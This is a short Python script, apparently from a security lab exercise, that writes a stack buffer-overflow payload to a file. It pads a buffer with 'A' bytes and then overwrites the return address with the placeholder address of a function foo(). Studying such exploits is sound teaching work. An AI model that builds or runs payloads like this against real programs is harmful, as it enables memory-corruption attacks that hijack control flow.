import sys
import struct

# Change the foo_address according to your environment
foo_address = 50

# Get the buffer_size from the command line argument
if len(sys.argv) < 2:
    print("Usage: python3 gen_exploit.py <buffer_size>")
    sys.exit(1)

buffer_size = int(sys.argv[1])

# Fill the buffer with junk data
payload = b'A' * buffer_size

# Overwrite the return address with the address of foo()
payload += struct.pack('<I', foo_address)

# Write the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)
